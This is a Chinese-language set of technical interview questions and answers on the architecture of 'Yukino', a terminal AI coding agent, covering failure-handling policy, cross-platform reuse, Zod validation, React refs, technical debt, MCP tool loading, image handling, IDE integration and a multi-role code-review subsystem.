### "系统中多处出现'best-effort' (尽力而为) 的注释——记忆提取失败静默、日志清理失败静默、MCP 连接失败仅警告. 这种失败处理哲学是否过于宽松? 边界在哪里? "

这不是宽松, 是精确的核心/外围区分. 判断准则: 该失败是否阻断用户的核心任务 (与 LLM 对话完成编码) ?

应静默降级的 (外围增强) :

- 记忆提取失败 → 只是少了长期记忆, 主对话无损 → `catch(() => {})` 合理;
- 日志清理失败 → 磁盘多留几个旧文件 → 合理;
- MCP 单服务器连接失败 → 其余服务器与全部内置工具仍可用 → warn + 继续合理;
- 上下文窗口 API 探测失败 → 回落静态表 → 合理 (见「配置系统的多层合并与降级链」) .

必须显式失败的 (核心路径) :

- LLM 主请求失败 → 用户必须知道 → error 事件 + UI 展示;
- 权限规则文件解析失败 → 安全相关, 不能默认放行或默认拒绝的"猜"—— RuleEngine 应 fail-closed (询问用户) ;
- 文件写入工具失败 → 返回错误给模型, 绝不假装成功.

边界判定三问: ① 失败信息对用户可行动吗 (可行动→显式; 不可行动→静默) ? ② 失败的替代路径存在吗 (存在→降级走替代; 不存在→显式) ? ③ 失败会掩盖安全问题吗 (会→fail-closed) ?

工程文化层面, 所有静默处都有 `log.warn/error` 落盘 (Pino 日志) —— 对用户静默 ≠ 对开发者静默, 可观测性兜底了 debuggability. 这是"韧性与噪音"的平衡: 每个外围失败都弹给用户, 工具将不可用 (狼来了效应) ; 全部静默则无法排查. Yukino 的分层 (用户层静默、日志层完备、核心层显式) 是教科书式的处理.

---

### "如果让你把 Yukino 的 TUI 移植到浏览器 (web 版) , 哪些模块可以零修改复用? 哪些必须重写? 架构上印证了什么? "

零修改复用 (约 80% 的代码量) :

- 全部领域层: `agent/`、`llm/`、`conversation/`、`compact/`、`session/`、`memory/`、`hooks/`、`permissions/`、`tools/` (大部分) 、`subagent/`、`teams/`、`skills/`、`commands/` (定义部分) 、`config/` (需把 YAML 文件读取换成 fetch/localStorage) 、`logger/` (换 transport) .
- 事实上 remote 模式已经证明了这一点 —— `server.ts` 在 Node 侧复用了全栈, 浏览器只是哑渲染端.

必须重写:

- `tui/` (Ink→React DOM, 但组件结构可映射: Static→普通列表、50ms 节流/稳定前缀缓存等模式直接搬) ;
- 平台原语: Bash 工具 (浏览器无子进程 —— 需服务端执行走 WS, 或换 WebContainers) 、文件系统工具 (IndexedDB/OPFS 或服务端代理) 、沙箱 (浏览器本身就是沙箱, 但文件访问能力受限) .

架构印证: 这正是「整体架构」与「四种运行模式复用同一套核心逻辑」设计的回报 —— 领域层零平台依赖 (所有平台原语经 `Tool`/`ToolContext` 接口注入) , UI 层是薄壳. remote 模式 (见「remote 模式的 WebSocket 协议」) 已经演示了"换皮"只需约 1700 行 server + 一个前端. 反过来说, 若当初把 `fs`/`spawn` 直接写进 Agent 核心, 移植就是灾难. 接口隔离的架构决策, 其价值在第二次移植时才完全兑现.

---

### "项目中既有 Zod 运行时校验, 又有 TypeScript 静态类型. 二者的分工边界在哪里? "

分工原则: 静态类型管"内部信任边界内", Zod 管"外部信任边界".

Zod 出现的位置 (全部是外部输入入口) :

- 配置文件解析 (`AppConfigSchema`、`ProviderConfigSchema`) —— 用户手写的 YAML;
- 会话 JSONL 行 (`SessionMessageSchema`) —— 可能被手工编辑或跨版本;
- 工具参数 (`AskUserQuestionTool` 的 `safeParseAsync`) —— LLM 生成的 JSON 是不可信输入, 幻觉可能产生非法结构;
- Hook 条件、记忆 frontmatter、命令 frontmatter、WS 入站消息 (`WsInboundSchema`/`UserMessageSchema`/`PermissionResponseSchema`) —— 网络边界;
- 记忆召回的 LLM JSON 响应.

纯 TS 类型的位置: 内部事件 (AgentEvent) 、消息模型、模块间接口 —— 同一进程内、同一编译单元, 类型由编译器保证, 运行时重复校验是纯成本.

两个细节值得学习:

1. `safeParse` 而非 `parse`: 边界校验失败时走降级路径 (如 WS 消息解析失败仅 log, 不崩连接) —— 校验的目的是容错而非崩溃;
2. Zod 推导 TS 类型 (`z.infer`) : 单一事实源在 schema, 类型零维护 —— 避免"校验规则与类型声明两处漂移".

LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function calling 输出本质是"半结构化自然语言", 不是可信协议 —— 校验 + 把校验错误回喂模型自我纠正, 是 Agent 鲁棒性的标配.

---

### "`app.tsx` 中大量服务实例 (client、registry、conv、teamManager…) 用 useRef 持有而不是 useState 或 Context. 如何论证这不是反模式? "

论证分三层:

1. 这些不是"状态", 是"服务". React 状态的概念是"随时间变化且变化需驱动渲染的数据". `ConversationManager`、`ToolRegistry` 们的内部数据变化不需要也不应该驱动 React 渲染 —— 驱动渲染的是它们的"投影" (messages、streamingText) . 把服务对象放进 useState 会误导数据流 (setState 一个 mutated 对象, 引用相等不触发渲染, 反而引入 bug) ; 放进 Context 则暗示"跨组件消费", 但这些服务只在 app.tsx 的事件循环里用.
2. useRef 的官方语义就是"与渲染无关的可变实例容器". `useRef(new ToolRegistry())` (惰性初始化在 ref 回调里做) 等价于 class 组件的实例字段 —— React 文档明确此用法 ("storing information that doesn't affect rendering") . `abortControllerRef`、`permissionResolveRef` 同理: Promise 句柄、定时器句柄都是"命令式句柄", 不是声明式状态.
3. 替代方案的真实代价: 引入 Redux/Zustand 管理这些服务? —— store 管的是可序列化状态, 服务实例 (带方法、闭包、异步句柄) 根本不该进 store; 用 Context + Provider? —— 增加了渲染订阅机制, 但没有任何组件需要"订阅 registry 的变化". 为不存在的需求引入抽象才是反模式.

收束: 判断标准是一句话 —— "这个数据变化时, UI 需要重渲染吗? " 需要 → state/context/store; 不需要 → ref/模块单例. Yukino 的分层 (服务在 ref、投影在 state) 让每个数据都有且仅有一个正确的家. 这也是「app.tsx 的状态分层策略」"React 只是领域对象的投影"论述的基础.

---

### "回顾整个项目, 你认为技术债务最明显的三处在哪里? 如何排期偿还? "

基于源码观察的三处 (需要展现"既欣赏设计也能直面问题") :

1. `app.tsx` 的巨石化 (2150 行、数百行命令 switch) : 命令分发逻辑应抽出为"命令处理器注册表" (每命令一个 handler 模块, 类似 remote 的 handleLocalUICommand 但更彻底) , 事件循环的 switch 拆为 handler 映射. 排期: 优先 —— 它是所有 UI 功能的必经之路, 腐烂速度最快; 偿还方式是小步重构 (每次抽一类命令) , 有现有测试兜底.
2. 权限系统的 YAML 规则与硬编码层级的混合: Layer 2/3 的安全规则 (只读命令表、危险模式正则) 硬编码在 checker.ts 中 —— 安全规则是变化最频繁的知识, 应外置为数据文件 (可热更新、可审计、可被规则引擎统一管理) . 排期: 中期 —— 功能正确但演进成本高; 偿还时附带「权限系统的下一步演进」提到的审计日志.
3. teammate 与 remote 的能力缺口 (remote 不支持 fork 技能/rewind/worktree, teammate 压缩后不重注入项目指令与长期记忆) : 这些是"显式降级"遗留 —— 诚实但确实是债. 排期: 按用户需求驱动 (YAGNI) , 但应先在共享层抽象"能力矩阵", 避免缺口靠口口相传.

回答结构: 指出问题 (文件+行号级证据) → 为什么是债 (变化点/腐烂速度) → 怎么还 (小步、有测试) → 何时还 (优先级逻辑) —— 展现的是工程管理能力而非抱怨.

---

### "最后一个问题: 如果只用三分钟向 CTO 介绍这个项目, 你会怎么讲? "

参考话术 (体现"提炼本质"的能力) :

> Yukino 是一个终端里的 AI 编程助手 —— 用户给它一个目标, 它自主地读代码、改代码、跑命令, 直到完成任务.
>
> 技术上它解决了四个真问题:
> 第一, 自治循环的可靠性. 核心是异步生成器驱动的事件流引擎, LLM 出错时有四档自愈 —— 限流退避、上下文压缩、输出续写、工具幻觉错误回灌自纠, 用户看到的是"永远在推进"而非报错.
> 第二, 安全. 七层权限管线加操作系统级沙箱 —— 模型可以自主工作, 但危险操作永远过不了用户这一关, 且所有决策可审计.
> 第三, 成本. 上下文窗口是钱 —— 我们用三级压缩 (大结果落盘、保留尾部摘要、工作记忆恢复) 、prompt 缓存三断点、便宜模型跑探索子代理, 把长任务成本压到可接受.
> 第四, 可扩展. 工具、技能、命令、钩子、MCP 五类扩展点全部是声明式的 (markdown + YAML) , 用户不改代码就能定制.
>
> 架构上最得意的一笔: 领域核心与宿主彻底解耦 —— 同一个引擎, 今天跑在终端 Ink UI 上, 明天一行不改跑在浏览器 (remote 模式已验证) 、CI 管道 (print 模式) 和后台代理集群 (teammate) 上.
>
> 它本质上是把分布式系统的工程方法论 —— 背压、熔断、降级、隔离 —— 应用到了 AI Agent 这个新物种上.

---

## 十八、补充子系统: MCP 加载策略、图像、IDE 集成与代码评审

### MCP 工具进入上下文的方式有哪三种模式? 为什么 tools 数组的稳定性如此重要?

`mcp/strategy.ts` 的 `decideAndApply()` 在 MCP 连接完成、全部内置工具注册之后执行一次 (时机刻意靠后: 模式判定要拿"全部工具 schema 总量"与上下文窗口比较) , 三种模式:

1. eager: 全部 MCP schema 的字符总量 (按 `CHARS_PER_TOKEN = 2.5` 折算, JSON 符号密集所以比值低于自然语言的 3.5) 低于上下文窗口的 10% (`DEFAULT_EAGER_THRESHOLD_PERCENT`, strategy.ts:51) → 全部进 tools[], 无延迟加载. 省下的上下文不值得为此承担任何复杂度.
2. native: 官方 Anthropic 端点 (`isOfficialAnthropicEndpoint()` 判定 host) → 工具留在 tools[] 但带 `defer_loading` 标记, 由服务端对模型隐藏; ToolSearch 命中后返回 `tool_reference`, 服务端再展开 schema. tools 数组字节级不变.
3. dispatch: 其他端点 (国产厂商、各类代理网关) 两者都不支持 → 自行模拟: MCP 工具完全不进 tools[], 模型统一经单一的 `McpCall` 工具按 `server__tool` 派发.

为什么如此在意 tools 数组的稳定性 —— strategy.ts:37-40 的注释给出了实测数据: tools 渲染在 system 之后、messages 之前, 数组任何变化都会使其后全部对话历史的 prompt cache 失效; 在一个 2 万 token 历史的会话里, 向 tools 末尾追加一个工具, 缓存命中率从 99.4% 跌到 9.5%, 等于全量重算. 所以 `exposeToolSearch`/`exposeMcpCall` 两个开关也是本模式判定时一次性算好并整个会话固定 (registry.ts:41-49 注释) , 避免"会话中途 tools[] 变化". 这是"用数据说话的缓存工程"范例.

### 图像支持是如何实现的? 从剪贴板粘贴到进入 LLM 上下文要经过哪些关卡?

链路 (`images/image.ts` + `images/clipboard.ts` + `tui/input.tsx` + `tui/at-expand.ts`) :

1. 粘贴入口: InputBox 的 `usePaste` 回调收到空文本时视为"可能粘贴了图像", 触发 `pasteImageFromClipboard()` (input.tsx:351) → `saveClipboardImage()` 平台分发读取剪贴板 —— macOS 用 `osascript`、Linux/Windows 各有实现 (clipboard.ts:141-207) ; 仅接受 PNG, 校验魔数 (`isPngBuffer`) 与大小上限.
2. 落盘与去重: 图像存入会话的 file-history 目录, 文件名取 `sha256(bytes).slice(0,16).png` (clipboard.ts:23) —— 与文件历史备份同一命名方案, 同一张图粘贴两次复用同一文件; 随后向输入框插入 `@<相对路径>` 引用.
3. 提交展开: `expandAtRefsWithImages()` (at-expand.ts:106) 识别图片后缀, `loadImageAttachment()` (image.ts:120) 走"格式魔数嗅探 → 尺寸/体积压缩"流水线 —— 扩展名不可信, 魔数判定真实格式 (sniffMediaType, image.ts:91-115) ; 原始字节 ≤ 3.75MB 直接透传 (5MB 是 base64 后的 API 上限, 3.75 = 5 \* 3/4) , 超限则用 sharp 压缩: 边长封顶 2000px, PNG 保格式压缩, 再沿 JPEG 质量 80/60/40/20 阶梯下降, 仍超限则尺寸减半重试 (最多两次) , GIF/WebP 需要压缩时重编码 (动图归一到首帧) .
4. 入上下文: 返回 base64 image content block, 每条用户消息上限 `MAX_IMAGES_PER_MESSAGE = 10` (image.ts:63) ; 会话持久化时 base64 内联进 JSONL (app.tsx:1869-1878) .
5. 上下文预算: 压缩估算里每个 image block 记 `IMAGE_CHAR_EQUIV = 7000` 字符 (约合 1750 token, Anthropic 单图成本量级, compact.ts:112) , 防止图像密集会话系统性低估、压缩过晚; 工具结果落盘则永远跳过 image 块 (agent.ts:517-519, 图片必须原样发给 API) .

这是一个典型的"多级降级管道": 每一关 (格式、体积、尺寸、数量) 都有明确上限与对应的降级动作, 而不是一刀切报错.

### VSCode/IDE 集成是如何实现的? `@file#L3-10` 行号引用从哪来?

`src/vscode/` 三个模块复用了 Claude Code 扩展的内嵌 MCP 服务器:

1. 发现 (lockfile.ts) : 扩展激活时写 `~/.claude/ide/<port>.lock` (JSON: workspaceFolders/pid/ideName/transport/authToken) , 并向集成终端注入 `CLAUDE_CODE_SSE_PORT` 环境变量. `detectIde()` 扫描锁文件, 匹配规则: 端口等于环境变量的优先; 否则 cwd 落在其 workspaceFolders 内且唯一匹配才采用; pid 已死的锁文件忽略. 路径比较做了 NFC/NFD 归一化 (macOS 返回 NFD、VSCode 上报 NFC, lockfile.ts:60-70) .
2. 连接 (ide-client.ts + ws-transport.ts) : 用 MCP SDK 的 Client 配自实现 `WebSocketTransport` (`ws://127.0.0.1:<port>`, 带 `X-Claude-Code-Ide-Authorization` 头) ; 连上后发 `ide_connected` 通知携带本进程 pid —— 扩展靠它把 Cmd+Option+K 路由到正确终端里的 CLI. 仅当疑似在 IDE 终端 (环境变量存在或 TERM_PROGRAM=vscode) 时才轮询等待扩展激活 (最多 30s, 每秒一次) , 否则立即放弃.
3. 消费: 监听 `at_mentioned` 通知 (扩展传来文件路径 + 0-based 行区间, ide-client.ts:106-118 转成 1-based) , app.tsx 把它拼成 `@相对路径#L3-10` 插入输入框 (app.tsx:405-436) ; 提交时 at-expand 的 `parseRef()` 正则解析行区间, 只内联指定行 (at-expand.ts:34-57) , 巨大文件也不怕 (有 MAX_RANGE_FILE_BYTES 上限) .

工程启示: 不重新发明 IDE 协议, 直接寄生在已有生态的发现机制 (锁文件 + 环境变量) 上, 用最小代码 (三个文件) 拿到"编辑器选中代码 → 终端 Agent 精确上下文"的高价值体验.

### `/review` 与 `/code-review` 是什么关系? 代码评审子系统如何用团队机制实现多角色评审?

两条产品路径:

1. `/review` (commands.ts:318) : 轻量路径, 类型为 `prompt` —— handler 返回一段固定提示词, 要求模型跑 `git status`/`git diff` 后以 `file:line` 形式报告正确性 bug、安全问题与可简化点. 无状态、零基础设施.
2. `/code-review` (commands.ts:304) : 重路径, 类型为 `local`, handler 返回 `code-review:{args}` 前缀字符串; 子命令分发逻辑实现在 `code-review/handler.ts` 的 `handleCodeReviewCommand()` —— create/add/remove/list/status/activate/deactivate 管理评审团队, request/requests/comment/accept/reject/report/approve/reject-request 管理评审请求, critic/critic-summary/add-critic 管理批评者评估 —— 值得注意当前源码中该函数尚无调用方接线, 属于"已实现、待接线"状态.

状态模型 (`code-review/manager.ts` + `session.ts`) :

- 团队持久化在 `.yukino/code-review-teams.json` (Zod schema: name/members/createdAt/lastActive) , 成员含 `role: reviewer | lead | junior | critic` 与 expertise 数组; `createTeam()` 同时在 TeamManager 里建同名团队并 addMember, 复用团队邮箱做消息路由 (manager.ts:92-109) ;
- 会话态的 `ReviewSession` (session.ts) 建模评审工作流: ReviewRequest → ReviewComment (带 `CommentResolution: accepted | rejected | pending | resolved`) → CriticAssessment (对评论合理性做 `reasonable | unreasonable | partially-reasonable` 评估) → ReviewSummary/FileFeedback/CommentIssue 分层汇总.

设计亮点: "评审员评论 → 批评者再评估评论"构成两级质检 (对 LLM 产出的评审意见本身做元评审) , 且角色/团队复用 teams 子系统的邮箱与成员管理 —— 评审子系统只新增了工作流状态机, 通信基础设施零重复.
